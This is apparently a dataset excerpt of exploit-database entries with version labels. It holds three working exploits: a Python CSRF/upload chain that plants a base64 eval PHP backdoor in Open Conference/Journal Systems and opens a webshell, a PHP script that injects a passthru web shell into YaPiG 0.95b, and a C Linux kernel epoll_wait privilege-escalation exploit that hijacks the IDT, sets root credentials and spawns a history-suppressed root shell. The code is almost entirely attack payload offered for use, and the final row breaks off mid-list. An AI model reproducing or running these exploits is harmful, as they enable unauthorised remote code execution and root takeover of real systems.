""GET / HTTP/1.1"" 200 - # # (+) Exploit sent to the client target 127.0.0.1 attacking 192.168.220.134. # (-) Code injection and execution failed! # (-) Target client may not logged into the admin interface of Open Systems..! # # localhost - - [23/Dec/2011 18:15:39] ""GET / HTTP/1.1"" 200 - # # (+) Exploit sent to the client target 127.0.0.1 attacking 192.168.220.134. # (!) Code injection worked! # (!) Launching webshell..! # # opensys_shell@192.168.220.134# id # uid=33(www-data) gid=33(www-data) groups=33(www-data) # # opensys_shell@192.168.220.134# uname -a # Linux steve-web-server 2.6.35-31-generic #62-Ubuntu SMP Tue Nov 8 14:00:30 UTC 2011 i686 GNU/Linux # # opensys_shell@192.168.220.134# q # # (+) Back to listening.. # # ^C(-) Exiting Exploit. # # .. have a merry christmas & happy new year !  import sys import urllib import urllib2  from optparse import OptionParser from BaseHTTPServer import HTTPServer  from BaseHTTPServer import BaseHTTPRequestHandler  from socket import gethostbyname, gethostname from time import sleep from base64 import b64encode   usage = ""./%prog [<options>] -t [target] -d [directory]"" usage += ""\nExample: ./%prog -p localhost:8080 -t 192.168.1.7 -d ocs-2.3.4 -P 80 -s seriousbiz""   parser = OptionParser(usage=usage) parser.add_option(""-p"", type=""string"",action=""store"", dest=""proxy"",                   help=""HTTP proxy <server:port>"") parser.add_option(""-t"", type=""string"", action=""store"", dest=""target"",                   help=""The target server <server:port>"") parser.add_option(""-d"", type=""string"", action=""store"", dest=""target_path"",                   help=""Directory path to the Open Conference/Journal/Harvester Systems"") parser.add_option(""-s"", type=""string"", action=""store"", dest=""conf_jour_arch"",                   help=""The target conference/journal/archive"") parser.add_option(""-P"", type=""int"", action=""store"", dest=""localport"",                   help=""The local port to have the target client connect back on"")   (options, args) = parser.parse_args()  # some variables phpkode = ""<?php error_reporting(0); eval(base64_decode($_SERVER[HTTP_HAX])); ?>"" # change the code if you want app_entry_id = ""1"" # change to the right conference/journal/archive id (default = 1) app_type = ""journals"" # (conferences, journals or archives)  def banner():     print (""\n\t| -------------------------------------------------------------------------------------------- |"")     print (""\t| Open Conference/Journal/Harvester Systems <= 2.3.4 csrf/upload remote code execution exploit |"")     print (""\t| found by mr_me ----------------------------------------------------------------------------- |\n"")  def test_proxy(): 	check = 1 	sys.stdout.write(""(+) Testing proxy @ %s.. "" % (options.proxy)) 	sys.stdout.flush() 	try: 		req = urllib2.Request(""http://www.google.com/"") 		req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req) 	except: 		check = 0 		pass 	if check != 0: 		sys.stdout.write(""proxy is found to be working!\n"") 		sys.stdout.flush() 	else: 		print (""proxy failed, exiting.."") 		sys.exit(1)  def submit_request(exploit, header=None, data=None): 	try: 		if header != None: 			headers = {} 			headers['Hax'] = header 		if data != None: 			data = urllib.urlencode(data) 		req = urllib2.Request(""http://""+exploit, data, headers) 		if options.proxy: 			req.set_proxy(options.proxy,""http"") 		check = urllib2.urlopen(req).read()         	except urllib.error.HTTPError, error: 		check = error.read() 	except urllib.error.URLError: 		print (""(-) Target connection failed, check your address"") 		sys.exit(1) 	return check   def check_request(req): 	req = urllib2.Request(""http://""+req) 	if options.proxy: 		req.set_proxy(options.proxy,""http"") 	return urllib2.urlopen(req).code 		 def check_shell(): 	full_request = options.target + ""/"" + options.target_path + ""/files/"" + app_type +""/"" + app_entry_id + ""/zeitgeist.php"" 	try: 		check_request(full_request) 		print (""(!) Code injection worked!"") 		return True 	except: 		print (""(-) Code injection and execution failed!"") 		print (""(-) Target client may not logged into the admin interface of Open Systems..!\n"")		 		return False 	return True  def drop_to_shell(): 	print (""(!) Launching webshell..!"") 	hn = ""\nopensys_shell@%s# "" % (options.target)         raw_cmd = """"         while raw_cmd != 'q':                 raw_cmd = raw_input(hn)                 base64_cmd = b64encode(""system(\""%s\"");"" % raw_cmd) 		try: 			full_request = options.target + ""/"" + options.target_path + ""/files/"" + app_type + ""/"" + app_entry_id + ""/zeitgeist.php""                 	cmd_response = submit_request(full_request, base64_cmd, """") 		except: 			print (""(-) Code injection and execution failed!"") 			print (""(-) Target client may not logged into the admin interface of Open Systems..!\n"") 			break 		print cmd_response.rstrip() 	print (""(+) Back to listening..\n"")  class myRequestHandler(BaseHTTPRequestHandler): 	def do_GET(self): 		self.printCustomHTTPResponse(200) 		if self.path == ""/"": 			target=self.client_address[0] 			self.response = """"""<html>  <body> <script> var target = 'http://[targethost]/[path]/index.php/[app]/index/manager/fileUpload/';  function fileUpload(fileData, fileName) { 	var fileSize = fileData.length, 	boundary = ""---------------------------270883142628617"", 	uri = target, 	xhr = new XMLHttpRequest(), 	fileFieldName = ""file""; 	xhr.open(""POST"", uri, true); 	xhr.setRequestHeader(""Content-Type"", ""multipart/form-data; boundary=""+boundary); 	xhr.setRequestHeader(""Content-Length"", fileSize); 	xhr.withCredentials = ""true""; 	var body = """"; 	body += addFileField(fileFieldName, fileData, fileName, boundary); 	body += ""--"" + boundary + ""--""; 	xhr.send(body); 	return true; } function addFileField(name, value, filename, boundary) { 	var c = ""--"" + boundary + ""\\r\\n"" 	c += 'Content-Disposition: form-data; name=""' + name + '""; filename=""' + filename + '""\\r\\n'; 	c += ""Content-Type: application/x-httpd-php\\r\\n\\r\\n""; 	c += value + ""\\r\\n""; 	return c;	 } function start() { 	fileUpload(""[phpkode]"", ""zeitgeist.php""); } start(); </script> </body> </html>""""""  			self.response = self.response.replace(""[targethost]"",options.target) 			self.response = self.response.replace(""[path]"",options.target_path) 			# slight variations.. 			if app_type == ""journals"": 				self.response = self.response.replace(""[app]/index"",options.conf_jour_arch) 			else: 				self.response = self.response.replace(""[app]"",options.conf_jour_arch) 			self.response = self.response.replace(""[phpkode]"",phpkode) 			self.wfile.write(self.response)          		print (""\n(+) Exploit sent to the client target %s attacking %s."" % (target,options.target)) 			sleep(2) # let the target get exploited, sheesh. 			if check_shell(): 				drop_to_shell() 			 	def printCustomHTTPResponse(self, respcode): 		self.send_response(respcode) 		self.send_header(""Content-type"", ""text/html"") 		self.send_header(""Server"", ""myRequestHandler"") 		self.end_headers()  def main(): 	# checks 	if len(sys.argv) <= 8: 		banner() 		parser.print_help() 		sys.exit(1) 	elif not options.target_path or not options.conf_jour_arch or not options.target: 		banner() 		parser.print_help() 		sys.exit(1) 	if not options.localport: 		port = 8080 	else: 		port = int(options.localport) 	httpd = HTTPServer(('', port), myRequestHandler) 	print ( 	""""""\n\t\t+==============================================================================================+ 	\t| Open Conference/Journal/Harvester Systems <= 2.3.X csrf/upload/remote code execution exploit | 	\t| Found by: mr_me						 	  		       | 	\t+==============================================================================================+"""""") 	if options.proxy:         	test_proxy() 	print (""(+) Listening on local port %d."" % port) 	print (""(+) Have someone connect to you at http://%s:%s/"" % (gethostbyname(gethostname()),port)) 	print (""\nType <ctrl>-c to exit..\n"") 	try: 		httpd.handle_request() 		httpd.serve_forever()  	except KeyboardInterrupt: 		print (""(-) Exiting Exploit."") 		sys.exit(1)  if __name__ == ""__main__"": 	main()","['2.3.x', '2.3.X']",0
3834,"YaPiG 0.95b - Remote Code Execution <?php   /*                              \\\|///                           \\  - -  //                            (  @ @ )                     ----oOOo--(_)-oOOo--------------------------------------------------                     Portal : YaPIG 0.95b                     Vendor : http://yapig.sourceforge.net                     Author : Dj7xpl                     We Are : Y4Ho0 -Mr.Mithridates -Sir SiSiLi -System Failure -Satanic Soulfull -And Me                     Email  : Dj7xpl@yahoo.com                     Home   : WwW.Dj7xpl.2600.ir                     ---------------Ooooo------------------------------------------------                                    (   )                           ooooO     ) /                           (   )    (_/                            \ (                             \_)  */  if ($argc<3) { print_r(' -----------------------------------------------------------------------------  Usage: php '.$argv[0].' Host Path shell Options host:       Target server (ip/hostname) path:       Path To Folder Shell:      Shell Name  Options:  -p[port]:    specify a port other than 80  -P[ip:port]: specify a proxy  Example: php '.$argv[0].' 127.0.0.1 /Yapig/ shell.php -P1.1.1.1:80  ----------------------------------------------------------------------------- ');  die; }  error_reporting(0); ini_set(""max_execution_time"",0); ini_set(""default_socket_timeout"",5);  function quick_dump($string) {   $result='';$exa='';$cont=0;   for ($i=0; $i<=strlen($string)-1; $i++)   {    if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))    {$result.=""  ."";}    else    {$result.=""  "".$string[$i];}    if (strlen(dechex(ord($string[$i])))==2)    {$exa.="" "".dechex(ord($string[$i]));}    else    {$exa.="" 0"".dechex(ord($string[$i]));}    $cont++;if ($cont==15) {$cont=0; $result.=""\r\n""; $exa.=""\r\n"";}   }  return $exa.""\r\n"".$result; } $proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)'; function sendpacket($packet) {   global $proxy, $host, $port, $html, $proxy_regex;   if ($proxy=='') {     $ock=fsockopen(gethostbyname($host),$port);     if (!$ock) {       echo 'No response from '.$host.':'.$port; die;     }   }   else { 	$c = preg_match($proxy_regex,$proxy);     if (!$c) {       echo 'Not a valid proxy...';die;     }     $parts=explode(':',$proxy);     echo ""Connecting to "".$parts[0]."":"".$parts[1]."" proxy...\r\n"";     $ock=fsockopen($parts[0],$parts[1]);     if (!$ock) {       echo 'No response from proxy...';die; 	}   }   fputs($ock,$packet);   if ($proxy=='') {     $html='';     while (!feof($ock)) {       $html.=fgets($ock);     }   }   else {     $html='';     while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {       $html.=fread($ock,1);     }   }   fclose($ock); } function make_seed() {    list($usec, $sec) = explode(' ', microtime());    return (float) $sec + ((float) $usec * 100000); }  $host=$argv[1]; $path=$argv[2]; $file=$argv[3];   $port=80; $proxy=""""; for ($i=7; $i<$argc; $i++){ $temp=$argv[$i][0].$argv[$i][1]; if (($temp<>""-p"") and ($temp<>""-P"")) {$cmd.="" "".$argv[$i];} if ($temp==""-p"") {   $port=str_replace(""-p"","""",$argv[$i]); } if ($temp==""-P"") {   $proxy=str_replace(""-P"","""",$argv[$i]); } } if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}  /*Data*/  $data.='-----------------------------7d6224c08dc Content-Disposition: form-data; name=""tit""  Fuck You! -----------------------------7d6224c08dc Content-Disposition: form-data; name=""aut""  Dj7xpl -----------------------------7d6224c08dc Content-Disposition: form-data; name=""mail""  dj7xpl@2600.ir -----------------------------7d6224c08dc Content-Disposition: form-data; name=""web""  <?php passthru($_GET[cmd]);?> -----------------------------7d6224c08dc Content-Disposition: form-data; name=""msg""  I Am Dj7xpl, I Want Fuck You! -----------------------------7d6224c08dc ';  echo ""Powered By Y! Underground Group\r\n""; echo ""discovered&Coded By Dj7xpl\r\n""; echo ""Sending Data To Target ...\n""; echo ""Shell : "".$host."""".$path.""1_"".$file.""\n"";  /*Sending Data*/ $packet =""POST "".$p.""add_comment.php?gid=1&phid=../../"".$file."" HTTP/1.0\r\n""; $packet.=""Content-Type: multipart/form-data; boundary=---------------------------7d6224c08dc\r\n""; $packet.=""Content-Length: "".strlen($data).""\r\n""; $packet.=""Host: "".$host.""\r\n""; $packet.=""Connection: Close\r\n\r\n""; $packet.=$data; sendpacket($packet); sleep(1);  ?>  # milw0rm.com [2007-05-02]",['0.95b'],1
1397,"Linux Kernel 2.6.9 < 2.6.11 (RHEL 4) - 'SYS_EPoll_Wait' Local Integer Overflow / Local Privilege Escalation /* * k-rad3.c - linux 2.6.11 and below CPL 0 kernel local exploit v3 * Discovered and original exploit coded Jan 2005 by sd <sd@fucksheep.org> * ********************************************************************* * * Modified 2005/9 by alert7 <alert7@xfocus.org> * XFOCUS Security Team http://www.xfocus.org * * gcc -o k-rad3 k-rad3.c -static -O2 * * tested succeed : *        on default installed RHEL4(2.6.9-5.EL and 2.6.9-5.ELsmp) *             2.6.9-5.EL ./k-rad3 -p 2 *             2.6.9-5.ELsmp ./k-rad3 -a -p 7 *        on default installed maglic linux 1.2  *             MagicLinux 2.6.9 #1 ./k-rad3 -t 1 -p 2 * * thank watercloud tested maglic linux 1.2 * thank eist provide RHEL4 to test * thank sd <sd@fucksheep.org> share his stuff. * thank xfocus & xfocus's firends * * * TODO: *         CASE 1: use stack > 0xc0000000 *         CASE 2: CONFIG_X86_PAE define ,but cpu flag no pse * *[alert7@MagicLinux ~]$ ./k-rad3 -h *[  k-rad3 - <=linux 2.6.11 CPL 0 kernel exploit  ] *[ Discovered Jan 2005 by sd <sd@fucksheep.org> ] *[ Modified 2005/9 by alert7 <alert7@xfocus.org> ] * *Usage: ./k-rad3 *       -s forced cpu flag pse *        -a define CONFIG_X86_PAE,default none *        -e <num> have two kernel code,default 0 *        -p <num> alloc pages(4k) ,default 1. Increase from 1 to 7 *                The higher number the more likely it will crash *        -t <num> default 0 *                0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192 * *[alert7@MagicLinux ~]$ ./k-rad3 -t 1 -p 2 *[  k-rad3 - <=linux 2.6.11 CPL 0 kernel exploit  ] *[ Discovered Jan 2005 by sd <sd@fucksheep.org> ] *[ Modified 2005/9 by alert7 <alert7@xfocus.org> ] *[+] try open /proc/cpuinfo .. ok!! *[+] find cpu flag pse in /proc/cpuinfo *[+] CONFIG_X86_PAE :none *[+] Cpu flag: pse ok *[+] Exploit Way : 0 *[+] Use 2 pages (one page is 4K ),rewrite 0xc0000000--(0xc0002000 + n) *[+] thread_size 1 (0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192 *[+] idtr.base 0xc0461000 ,base 0xc0000000 *[+] kwrite base 0xc0000000, buf 0xbffed750,num 8196 *[+] idt[0x7f] addr 0xffc003f8 *[+] j00 1u(k7 k1d! *[root@k-rad3 ~] #id *uid=0(root) gid=0(root) groups=500(alert7) * * *  Linux Kernel <= 2.6.11 ""sys_epoll_wait"" Local integer overflow Exploit *  * ""it is possible to partially overwrite low kernel ( >= 2.6 <= 2.6.11)  * memory due to integer overflow in sys_epoll_wait and misuse of * __put_user in ep_send_events"" * Georgi Guninski: http://seclists.org/lists/fulldisclosure/2005/Mar/0293.html * ********************************************************************* * * * In memory of pwned.c (uselib) *  * - Redistributions of source code is not permitted. * - Redistributions in the binary form is not permitted. * - Redistributions of the above copyright notice, this list of conditions, * and the following disclaimer is permitted. * - By proceeding to a Redistribution and under any form of the Program * the Distributor is granting ownership of his Resources without * limitations to the copyright holder(s). * *  * Since we already owned everyone, theres no point keeping this private * anymore. * * http://seclists.org/lists/fulldisclosure/2005/Mar/0293.html * * Thanks to our internet hero georgi guninski for being such incredible * whitehat disclosing one of the most reliable kernel bugs. * You saved the world, man, we owe you one! * * This version is somewhat broken, but skilled reader will get an idea. * Well, at least let the scriptkids have fun for a while. * * Thanks to all who helped me developing/testing this, you know who you are, * and especially to my gf for guidance while coding this. * */  #define _GNU_SOURCE  #include <stdlib.h> #include <stdio.h> #include <sys/types.h> #include <sys/socket.h> #include <sys/epoll.h> #include <sys/mman.h> #include <sys/resource.h> #include <linux/capability.h> #include <asm/unistd.h> #ifndef __USE_GNU 	#define __USE_GNU #endif #include <unistd.h> #include <errno.h> #include <signal.h> #include <string.h>  /**   * Relationship Variables   *   * 1: CONFIG_X86_PAE    *     see /lib/modules/`uname -r`/build/.config   *     1.1: pse   * 2: THREAD_SIZE   *     see include/asm/thread_info.h THREAD_SIZE define   */   #define MAP (0xfffff000 - (1023*4096)) #define MAP_PAE (0xfffff000 - (511*4096)) #define MKPTE(addr) ((addr & (~4095)) | 0x27) #define MKPMD(x) (0x1e3|0x004)  ////////////////////////////////////////////////  #define KRADPS1 ""k-rad3""  #define kB * 1024 #define MB * 1024 kB #define GB * 1024 MB  #define KRS ""\033[1;30m[ \033[1;37m"" #define KRE ""\033[1;30m ]\033[0m"" #define KRAD ""\033[1;30m[\033[1;37m*\033[1;30m]\033[0m "" #define KRADP ""\033[1;30m[\033[1;37m+\033[1;30m]\033[0m "" #define KRADM ""\033[1;30m[\033[1;37m-\033[1;30m]\033[0m ""  #define SET_IDT_GATE(idt,ring,s,addr) \ 	(idt).off1 = addr & 0xffff; \ 	(idt).off2 = addr >> 16; \ 	(idt).sel = s; \ 	(idt).none = 0; \ 	(idt).flags = 0x8E | (ring << 5);   //config val static int havepse 		= 0; static int definePAE	= 0; static int exploitway	= 0; static int npages 		= 1; static int thread_size   = 0;   static uid_t uid		= 0; static unsigned long long *clear1; static char * progargv0;  struct idtr { 	unsigned short limit; 	unsigned int base; } __attribute__ ((packed));  struct idt { 	unsigned short off1; 	unsigned short sel; 	unsigned char none,flags; 	unsigned short off2; } __attribute__ ((packed));    #define __syscall_return(type, res) \ do { \ 	if ((unsigned long)(res) >= (unsigned long)(-125)) { \ 	errno = -(res); \ 	res = -1; \ 	} \ 	return (type) (res); \ } while (0)   #define _capget_macro(type,name,type1,arg1,type2,arg2) \ 	type name(type1 arg1,type2 arg2) \ 	{ \ 	long __res; \ 	__asm__ volatile ( ""int $0x80"" \ 	: ""=a"" (__res) \ 	: ""0"" (__NR_##name),""b"" ((long)(arg1)),""c"" ((long)(arg2))); \ 	__syscall_return(type,__res); \ 	}  static inline _capget_macro(int,capget,void *,a,void *,b);  static int THREAD_SIZE_MASK =(-4096);   static void  fatal(const char *message) { 	system(""uname -a""); 	printf(""[-] %s\n"",message); 	exit(1); }  void kernel(unsigned * task) { 	unsigned * addr = task; 	/* looking for uids */  	*clear1 = 0;  	while (addr[0] != uid || addr[1] != uid || 		addr[2] != uid || addr[3] != uid 		) 		addr++; 	 	addr[0] = addr[1] = addr[2] = addr[3] = 0; /* set uids */ 	addr[4] = addr[5] = addr[6] = addr[7] = 0; /* set gids */  }   void kcode(void); void __kcode(void) { 	asm( 	""kcode: \n"" 	""cld \n"" 	"" pusha \n"" 	"" pushl %es \n"" 	"" pushl %ds \n"" 	"" movl %ss,%edx \n"" 	"" movl %edx,%es \n"" 	"" movl %edx,%ds \n""); 	__asm__(""movl %0 ,%%eax"" ::""m""(THREAD_SIZE_MASK) ); 	asm( 	"" andl %esp,%eax \n"" 	"" pushl (%eax) \n"" 	"" call kernel \n"" 	"" addl $4, %esp \n"" 	"" popl %ds \n"" 	"" popl %es \n"" 	"" popa \n"" 	"" cli \n"" 	"" iret \n"" 	); }   void raise_cap(unsigned long *ts) { /* must be on lower addresses because of kernel arg check :) */ static struct __user_cap_header_struct head; static struct __user_cap_data_struct data; static struct __user_cap_data_struct n;  int i;  *clear1 = 0; head.version = 0x19980330; head.pid = 0; capget(&head, &data); /* scan the thread_struct */ for (i = 0; i < 512; i++, ts++)  { 	/* is it capabilities block? */ 	if (  (ts[0] == data.effective) && 		(ts[1] == data.inheritable) && 		(ts[2] == data.permitted))  	{ 		/* set effective cap to some val */ 		ts[0] = 0x12341234; 		capget(&head, &n); 		/* and test if it has changed */ 		if (n.effective == ts[0])  		{ 			/* if so, we're in :) */ 			ts[0] = ts[1] = ts[2] = 0xffffffff; 			return; 		} 		/* otherwise fix back the stuff 		(if we've not crashed already :) */ 		ts[0] = data.effective; 	} } return; }   void stub(void); void __stub(void) { 	asm ( 	""stub:;"" 	"" pusha;"" 	); 	__asm__(""movl %0 ,%%eax"" ::""m""(THREAD_SIZE_MASK) ); 	asm( 	"" and %esp, %eax;"" 	"" pushl (%eax);"" 	"" call raise_cap;"" 	"" pop %eax;"" 	"" popa;"" 	"" iret;"" 	);  }   /* write to kernel from buf, num bytes */ static int  kwrite(unsigned base, char *buf, int num) { #define DIV 256 #define RES 4  int efd, c, i, fd; int pi[2]; struct epoll_event ev; int *stab; unsigned long ptr; int count; unsigned magic = 0xffffffff / 12 + 1;  	printf(""[+] kwrite base %p, buf %p,num %d\n"", (void *)base,buf,num); 	/* initialize epoll */ 	efd = epoll_create(4096); 	if (efd < 0) 		return -1; 	 	ev.events = EPOLLIN|EPOLLOUT|EPOLLPRI|EPOLLERR|EPOLLHUP;  	/* 12 bytes per fd + one more to be safely in stack space */ 	count = (num+11)/12+RES;  	/* desc array */ 	stab = alloca((count+DIV-1)/DIV*sizeof(int));  	for (i = 0; i < ((count+DIV-1)/DIV)+1; i++)  	{  		if (socketpair(AF_UNIX, SOCK_DGRAM, 0, pi) < 0) 			return -1;  		send(pi[0], ""a"", 1, 0); 		stab[i] = pi[1]; 	}  	/* highest fd and first descriptor */ 	fd = pi[1]; 	/* we've to allocate this separately because we need to have 	it's fd preserved - using this we'll be writing actual bytes */ 	epoll_ctl(efd, EPOLL_CTL_ADD, fd, &ev); 	//printf(""EPOLL_CTL_ADD count %u\n"",count); 	for (i = 0, c = 0; i < (count-1); i++)  	{ 		int n; 		n = dup2(stab[i/DIV], fd+2+(i % DIV)); 		if (n < 0) 			return -1; 		epoll_ctl(efd, EPOLL_CTL_ADD, n, &ev); 		close(n); 	}  	/* in 'n' we've the latest fd we're using to write data */ 	for (i = 0; i < ((num+7)/8); i++)  	{ 		/* data being written from end */ 		memcpy(&ev.data, buf + num - 8 - i * 8, 8); 		epoll_ctl(efd, EPOLL_CTL_MOD, fd, &ev);  		/* the actual kernel magic */ 		ptr = (base + num - (i*8)) - (count * 12); 		struct epoll_event *events =(struct epoll_event *)ptr; 		//printf(""epoll_wait verify_area(%p,%p) addr %p %p\n"",ptr,magic* sizeof(struct epoll_event) ,&events[0].events,magic); 		int iret =epoll_wait(efd, (void *) ptr, magic, 31337); 		if (iret ==-1) 		{ 			perror(""epoll_wait""); 			fatal(""This kernel not vulnerability!!!"");  		} 		/* don't ask why (rotten rb-trees) :) */ 		if (i) 		{ 			//printf(""epoll_wait verify_area(%p,%p) %p\n"",ptr,magic* sizeof(struct epoll_event) ,magic); 			iret = epoll_wait(efd, (void *)ptr, magic, 31337); 	                if (iret ==-1)         	        {                 	       perror(""epoll_wait""); 				fatal(""This kernel not vulnerability!!!""); 	         	        }  		} 	}  	close(efd); 	for (i = 3; i <= fd; i++) 		close(i); 	 	return 0; 	 }  /* real-mode interrupt table fixup - point all interrupts to iret. let's hope this will shut up apm */ static void fixint(char *buf) { unsigned *tab = (void *) buf; int i;  	for (i = 0; i < 256; i++) 		tab[i] = 0x0000400; /* 0000:0400h */ 	/* iret */ 	buf[0x400] =0xcf;  }  /* establish pte pointing to virtual addr 'addr' */ static int  map_pte(unsigned base, int pagenr, unsigned addr) { 	unsigned *buf = alloca(pagenr * 4096 + 8); 	buf[(pagenr) * 1024] = MKPTE(addr); 	buf[(pagenr) * 1024+1] = 0;	 	fixint((void *)buf); 	return kwrite(base, (void *)buf, pagenr * 4096 + 4); }  /* make pme user can rw */ static int  map_pme(unsigned base, int pagenr, unsigned addr) { 	unsigned *buf = alloca(pagenr * 4096 + 32); 	buf[(pagenr) * 1024] = MKPMD(addr); 	buf[(pagenr) * 1024+1] = 0;	 	buf[(pagenr) * 1024+2] = MKPMD(addr)|0x00200000; 	buf[(pagenr) * 1024+3] = 0;	 	fixint((void *)buf); 	return kwrite(base, (void *)buf, pagenr * 4096 + 4*3); }   static void  error(int d) { 	printf(KRADM ""y3r 422 12 n07 3r337 3nuPh!\n"" KRAD ""Try increase nrpages?\n""); 	exit(1); }   	char *bashargv[] = { KRADPS1, NULL }; 	char *bashenvp[] = { 	""TERM=linux"", ""PS1=[\\u@""KRADPS1"" \\W]\\$ "", ""BASH_HISTORY=/dev/null"", 					""HISTORY=/dev/null"", ""history=/dev/null"",""HISTFILE=/dev/null"", 					""PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/local/bin:/usr/local/sbin"", NULL };  static int  exploit(unsigned kernelbase, int npages) { 	struct idt *idt; 	struct idtr idtr;    	signal(SIGSEGV, error); 	signal(SIGBUS, error);   	/* get idt descriptor addr */ 	asm (""sidt %0"" : ""=m"" (idtr)); 	/* 	  * if OS in vmware , idtr.base is not right,please fix it 	  * [alert7@MagicLinux ~]$ cat /boot/System.map|grep idt_table 	  * c0461000 D idt_table 	  * //idtr.base = 0xc0461000; 	  */ 	 	printf(""[+] idtr.base %p ,base %p\n"",(void *)idtr.base , (void *)kernelbase); 	 	if ( !definePAE ) 	{ 		map_pte(kernelbase, npages, idtr.base - kernelbase); 		//	idt = pae?(void *)MAP_PAE:(void *)MAP;		 		idt = (struct idt *)MAP; 	}else 	{ 		/* TODO: pse disable case */ 		if ( !havepse) 			printf(""[!Waring!] TODO:CONFIG_X86_PAE define ,but cpu flag no pse\n""); 		 		map_pme(kernelbase, npages, idtr.base - kernelbase); 		idt = (struct idt *) idtr.base; 	}  #if 0 	int * p = (int *) idt; 	int i; 	for (i=0;i<1024;i++,p++) 		printf( ""* %p 0x%x\n"",p,*p); 	fflush(stdout); #endif  	/** 	  * cleanup the stuff to prevent others spotting the gate  	  * - must be done from ring 0  	  */ 	clear1 = (void *) &idt[0x7f]; 	printf(""[+] idt[0x7f] addr %p\n"",clear1);  	if ( exploitway == 0) 	{ 		SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &kcode)); 	} 	else  	{ 		SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &stub)); 	} 	 	//[2] SET_IDT_GATE(idt[0x7f], 3, idt[0x80].sel, ((unsigned long) &stub)); 	/** 	  * also can use [2] stub function,but it may cause this message 	  * 	  *	Sep 11 13:11:59 AD4 kernel: Debug: sleeping function called from invalid context at include/asm/uaccess.h:531 	  *	Sep 11 13:11:59 AD4 kernel: in_atomic():0[expected: 0], irqs_disabled():1 	  *	Sep 11 13:11:59 AD4 kernel:  [<c011ca30>] __might_sleep+0x7d/0x89 	  *	Sep 11 13:11:59 AD4 kernel:  [<c01270bd>] sys_capget+0x1d5/0x216 	  *	Sep 11 13:11:59 AD4 kernel:  [<c0301bfb>] syscall_call+0x7/0xb 	  *	Sep 11 13:11:59 AD4 kernel:  [<c017007b>] pipe_writev+0x24/0x320 	  *	Sep 11 13:11:59 AD4 kernel:  [<c01619a4>] filp_close+0x59/0x5f 	  * 	  */  	/* call raise_cap or kernel */ 	asm (""int $0x7f""); 	printf(KRADP ""j00 1u(k7 k1d!\n""); 	setresuid(0, 0, 0); 	setresgid(0, 0, 0); 	char cmdbuf[1024]; 	snprintf(cmdbuf,1024,""chown root %s;chmod +s %s"",progargv0,progargv0); 	system(cmdbuf); 	 	execve(""/bin/sh"", bashargv, bashenvp); 	exit(0); }    static void  usage(char *n) { 		 	printf(""\nUsage: %s\n"",n); 	printf(""\t-s forced cpu flag pse \n""); 	printf(""\t-a define CONFIG_X86_PAE,default none\n""); 	printf(""\t-e <num> have two kernel code,default 0\n""); 	printf(""\t-p <num> alloc pages(4k) ,default 1. Increase from 1 to 7\n"" 		 ""\t\tThe higher number the more likely it will crash\n""); 	printf(""\t-t <num> default 0 \n"" 		  ""\t\t0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192\n""); 	printf(""\n""); 	_exit(1); }   /*read /proc/cpuinfo to set  havepse*/ static void  read_proc(void) {             FILE * fp;             char * line = NULL;             size_t len = 0;             ssize_t read; 	     printf(""[+] try open /proc/cpuinfo .."");             fp = fopen(""/proc/cpuinfo"", ""r"");             if (fp == NULL)             {                  printf("" failed!!\n"");                  return;             } 	     printf("" ok!!\n"");	 		  	     int cpus = 0;	 	     int pse = 0;             while ((read = getline(&line, &len, fp)) != -1)  		{  		   if (strstr(line,""flags"")) 		   { 			if(strstr(line ,""pse "")) 			{ 				pse ++; 			} 		   }              } 	     fclose(fp); 		              if (line)                  free(line); 			 	     if ( pse ) 		{ 				printf(""[+] find cpu flag pse in /proc/cpuinfo\n""); 				havepse = 1; 	     	}              return ;  }  static void  get_config(int ac, char **av) { 	 	uid = getuid(); 	progargv0 = av[0];  	int r; 	 	while(ac) { 		r = getopt(ac, av, ""e:p:t:ash""); 		 		if(r<0) break;  		switch(r) {  			case 's' : 			//pse 				havepse = 1; 				break;  			case 'a' : 			//define CONFIG_X86_PAE 				definePAE = 1; 				break;  			case 'e' : 				exploitway = atoi(optarg); 				if(exploitway<0) fatal(""bad exploitway value""); 				break;  			case 'p' : 				npages = atoi(optarg); 				break; 			case 't' : 				thread_size = atoi(optarg); 				 				break;				 				 			case 'h' : 			default: 				usage(av[0]); 				break; 		} 	}	  	THREAD_SIZE_MASK = (thread_size==0)?(-4096):(-8192);  	read_proc(); }  static void  print_config(unsigned long kernebase) { 	printf(""[+] CONFIG_X86_PAE :%s\n"",	definePAE 	?""ok"":""none""); 	printf(""[+] Cpu flag: pse %s\n"",			havepse		?""ok"":""none"");	 	printf(""[+] Exploit Way : %d\n"",		exploitway); 	printf(""[+] Use %d pages (one page is 4K ),rewrite 0x%lx--(0x%lx + n)\n"", 			npages,kernebase,kernebase+npages*4 kB); 	printf(""[+] thread_size %d (0 :THREAD_SIZE is 4096;otherwise THREAD_SIZE is 8192 \n"",thread_size); 	fflush(stdout); }   void prepare(void) {     if (geteuid() == 0)      { 	 setresuid(0, 0, 0); 	 setresgid(0, 0, 0);       	 execve(""/bin/sh"", bashargv, bashenvp);         fatal(""[-] Unable to spawn shell"");     } }  int main(int argc, char **argv) { 	char eater[65536]; 	unsigned long kernelbase;  	/* unlink(argv[0]); */ 	// sync(); 	 	printf(KRS "" ""KRADPS1"" - <=linux 2.6.11 CPL 0 kernel exploit "" KRE ""\n"" 		KRS ""Discovered Jan 2005 by sd <sd@fucksheep.org>"" KRE ""\n"" 		KRS ""Modified 2005/9 by alert7 <alert7@xfocus.org>"" KRE ""\n"");  	if ( (unsigned long)eater > 0xc0000000) 	{ 		printf(""[!Waring!] TODO:use stack > 0xc0000000 \n""); 		return 0; 	} 	 	prepare(); 	 	get_config(argc,argv);  	kernelbase =(unsigned long)eater ; 	kernelbase +=0x0fffffff; 	kernelbase &=0xf0000000; 	 	print_config(kernelbase);  	exploit(kernelbase, npages<0?-npages:npages);  	return 0;  }  // milw0rm.com [2005-12-30]","['2.6.9 < 2.6.11', '4)', '2.6.11', '2.6.95.ELsmp)', 